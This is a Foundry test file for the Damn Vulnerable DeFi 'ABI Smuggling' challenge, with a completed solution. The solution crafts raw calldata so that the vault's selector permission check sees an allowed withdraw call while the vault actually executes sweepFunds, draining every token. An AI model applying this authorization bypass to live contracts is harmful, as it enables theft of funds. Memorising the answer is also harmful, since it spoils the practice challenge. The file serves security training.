// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
// Step 1: Create the execute() function selector (0x1cff79cd)
        bytes4 executeSelector = bytes4(keccak256("execute(address,bytes)"));

        // Step 2: Target address (the vault itself)
        bytes memory targetAddress = abi.encode(address(vault));

        // Step 3: Set offset for actionData to 0x80 (4 * 32 bytes from selector)
        bytes memory bytesLocation = abi.encode(0x80);

        // Step 4: Empty bytes where actionData length should be
        bytes memory emptyBytes = abi.encode(0x0);

        // Step 5: The withdraw selector that will be checked (0xd9caed12)
        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
        
        // Step 6: Length of actual actionData (0x44 = 68 bytes = 4 + 32 + 32)
        bytes memory bytesLength = abi.encode(0x44);

        // Step 7: The actual sweepFunds selector we want to execute
        bytes4 sweepSelector = bytes4(keccak256("sweepFunds(address,address)"));

        // Step 8: Parameters for sweepFunds
        bytes memory sweepParams = abi.encode(recovery, address(token));

        // Step 9: Construct the full payload
        bytes memory payload = bytes.concat(
            executeSelector,
            targetAddress,
            bytesLocation,
            emptyBytes,
            withdrawSelector,
            bytes28(0), // padding after withdraw selector
            bytesLength,
            sweepSelector,
            sweepParams
        );

        // Step 10: Execute the call
        (bool success,) = address(vault).call(payload);
        require(success, "Attack failed");
   
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
